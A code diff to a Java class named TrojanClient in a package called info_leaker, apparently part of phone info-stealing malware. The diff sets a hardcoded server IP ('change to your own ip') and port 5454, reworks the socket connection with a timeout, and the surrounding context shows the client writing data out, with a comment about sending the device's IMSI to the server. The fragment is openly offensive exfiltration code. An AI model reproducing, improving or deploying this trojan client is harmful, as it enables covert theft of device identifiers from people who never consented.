@@ -3,13 +3,14 @@ package com.info_leaker;
 import java.io.BufferedWriter;
 import java.io.IOException;
 import java.io.OutputStreamWriter;
+import java.net.InetSocketAddress;
 import java.net.Socket;
 
 
 public class TrojanClient {
 	public static final int PORT = 5454;
 	// change to your own ip
-	public static final String IP = "59.78.12.107";
+	public static final String IP = "192.168.106.1";
 	
 	boolean isConnect = false;
 	BufferedWriter os = null;		// output stream
@@ -17,11 +18,11 @@ public class TrojanClient {
 	GetInfo m_getinfo;
 
 	public TrojanClient(GetInfo gi){
-		
 		try {
 			m_getinfo = gi;
-			m_socket = new Socket(IP, PORT);
-			m_socket.setSoTimeout(100);
+			m_socket = new Socket();
+			InetSocketAddress addr = new InetSocketAddress(IP, PORT);
+			m_socket.connect(addr, 100);
 			isConnect = true;
 			os = new BufferedWriter(new OutputStreamWriter(m_socket.getOutputStream()));
 			// send IMSI to server
